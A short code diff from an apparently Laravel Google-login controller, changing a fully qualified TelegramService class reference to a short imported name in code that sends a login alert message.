@@ -208,7 +208,7 @@ class GoogleController extends Controller
                     'status' => 'success',
                 ]);
 
-                $tg = app(\App\Services\TelegramService::class);
+                $tg = app(TelegramService::class);
                 $tg->sendMessage(
                     "<b>🔴 [GOOGLE LOGIN ALERT]</b>\n" .
                     "━━━━━━━━━━━━━━━━━━━━━\n" .
